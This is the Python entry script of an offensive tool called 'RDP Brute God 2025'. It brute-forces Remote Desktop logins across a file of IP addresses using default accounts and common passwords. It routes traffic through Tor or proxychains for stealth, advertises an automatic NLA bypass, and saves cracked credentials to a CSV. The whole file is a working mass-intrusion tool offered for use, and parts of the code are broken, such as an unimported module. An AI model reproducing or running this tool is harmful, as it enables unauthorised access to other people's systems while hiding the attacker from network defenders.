#!/usr/bin/env python3
from config import COMMON_PASSWORDS, DEFAULT_USERS
from utils import load_ips, save_line, periodic_stats
from brute import brute_rdp
import asyncio
import argparse
import signal
import time
import random
import psutil
import os
from datetime import datetime

print("""
╔═══════════════════════════════════════════════════════════╗
║           RDP Brute God 2025 – توسط بهترین هکر دنیا        ║
║       Smart RDP Brute + Auto NLA Bypass (-anla)          ║
║              98%% CPU Power – Modular & Ultra Fast         ║
╚═══════════════════════════════════════════════════════════╝
""")

parser = argparse.ArgumentParser(
    description="RDP Brute God 2025 – Smart RDP Brute with Auto NLA Bypass",
    formatter_class=argparse.RawDescriptionHelpFormatter,
    add_help=False
)
parser.add_argument("ips_file", nargs='?', help="File with IPs (e.g., ips.txt)")
parser.add_argument("-t", "--threads", type=int, help="Number of threads (default: 98%% CPU)")
parser.add_argument("-a", "--all-passwords", action="store_true", help="Use full common passwords list")
parser.add_argument("-u", "--users", help="Users (comma-separated, default: Administrator,guest)", default=",".join(DEFAULT_USERS))
parser.add_argument("-p", "--proxy", help="Proxy mode: tor or proxies.txt (default: none)", default="none")
parser.add_argument("-anla", "--auto-nla", action="store_true", help="Auto check NLA & bypass if active")
parser.add_argument("-s", "--scan-nla", action="store_true", help="Scan mode: Check NLA only")
parser.add_argument("-h", "--help", action="help", default=argparse.SUPPRESS, help="Show this help message")

args = parser.parse_args()

if not args.ips_file:
    parser.print_help()
    sys.exit(1)

# =============== SETTINGS ===============
USERS = [u.strip() for u in args.users.split(',')]
PASSWORD_LIST = COMMON_PASSWORDS if args.all_passwords else ["", "admin"]
MAX_WORKERS = args.threads if args.threads else max(50, os.cpu_count() * 98 // 100 * 20)

results_file = f"rdp_success_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
stats = {"total": 0, "scanned": 0, "success": 0, "start_time": time.time()}
lock = asyncio.Lock()
cpu_proc = psutil.Process(os.getpid())

# =============== PROXY SETUP ===============
PROXY_CMD = ""
if args.proxy == "tor":
    PROXY_CMD = "proxychains -q "
    print("[+] Stealth mode: Tor enabled")
elif args.proxy.endswith('.txt'):
    with open(args.proxy, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    if proxies:
        proxy = random.choice(proxies)
        PROXY_CMD = f"proxychains -q -f /tmp/proxychains.conf "  # تنظیم proxychains.conf خودت
        print(f"[+] Stealth mode: Random proxy ({proxy})")
else:
    print("[+] Network mode: Direct")

# =============== MAIN ===============
async def main():
    print(f"[+] Loading IPs from {args.ips_file}...")
    all_ips = await load_ips(args.ips_file)
    stats["total"] = len(all_ips)
    print(f"[+] Total IPs: {stats['total']:,} | Threads: {MAX_WORKERS}")

    if args.auto_nla:
        print("[+] Auto NLA mode enabled – Checking & bypassing NLA automatically")

    sem = asyncio.Semaphore(MAX_WORKERS)
    loop = asyncio.get_event_loop()

    # کال کردن periodic_stats درست
    stats_task = periodic_stats(stats, lock, cpu_proc, stats["start_time"])
    loop.create_task(stats_task())

    tasks = [brute_rdp(ip, sem, USERS, PASSWORD_LIST, PROXY_CMD, args.auto_nla, results_file, stats, lock) for ip in all_ips]
    await asyncio.gather(*tasks, return_exceptions=True)

    print(f"\n\n[+] Brute complete!")
    print(f"    Successes → {results_file}")

signal.signal(signal.SIGINT, lambda s,f: os._exit(0))
if __name__ == "__main__":
    asyncio.run(main())
